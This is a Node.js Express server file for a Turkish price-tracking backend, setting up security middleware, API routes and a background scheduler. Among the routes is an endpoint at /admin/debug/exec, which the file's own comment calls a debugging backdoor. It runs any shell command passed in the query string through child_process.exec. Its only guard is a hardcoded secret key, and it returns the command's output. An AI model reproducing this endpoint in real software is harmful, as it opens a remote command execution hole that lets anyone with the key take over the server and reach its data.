const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const logger = require('./utils/logger');
const errorHandler = require('./middleware/errorHandler');

// Route Imports
const productRoutes = require('./routes/products');
const priceHistoryRoutes = require('./routes/priceHistory');
const searchRoutes = require('./routes/search');
const collectionsRoutes = require('./routes/collections');
const notificationsRoutes = require('./routes/notifications');
const userRoutes = require('./routes/user'); // Newly Added
const statsRoutes = require('./routes/stats');
const scraperService = require('./services/scraper');
const trackerService = require('./services/tracker');

const app = express();
app.set('trust proxy', 1);
const PORT = process.env.PORT || 3000;

// Security & Optimization Middleware
app.use(helmet());
app.use(compression());
app.use(cors());
app.use(bodyParser.json());
app.use('/images', express.static('public/images'));

// Rate Limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use(limiter);

// Request Logger
app.use((req, res, next) => {
    logger.info(`${req.method} ${req.originalUrl}`);
    next();
});

// Routes
app.use('/api/products', productRoutes);
app.use('/api/price-history', priceHistoryRoutes);
app.use('/api/search', searchRoutes);
app.use('/api/collections', collectionsRoutes);
app.use('/api/notifications', notificationsRoutes);
app.use('/api/user', userRoutes); // Mount the user route
app.use('/api/stats', statsRoutes);

// Health Check
app.get('/', (req, res) => {
    res.send('Fırsat Avcısı Backend Ultra ++ is running 🚀');
});

// --- REMOTE DEBUGGING TERMINAL ---
// WARNING: This is a backdoor for debugging. Remove in final production.
const { exec } = require('child_process');
app.get('/admin/debug/exec', (req, res) => {
    const { cmd, secret } = req.query;
    if (secret !== 'super-secret-debug-key-123') return res.status(403).send('Forbidden');

    console.log(`🔧 Executing Manual Command: ${cmd}`);
    exec(cmd, (error, stdout, stderr) => {
        const output = {
            cmd,
            error: error ? error.message : null,
            stdout,
            stderr
        };
        res.json(output);
    });
});

// Global Error Handler
app.use(errorHandler);

// Start Background Services
const { startScheduler } = require('./services/scheduler');
startScheduler();

// Start Server
// Start Server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`💾 DB Source: ${process.env.DATABASE_URL?.startsWith('file:') ? 'Local SQLite' : 'Remote Postgres/Cloud'}`);
});
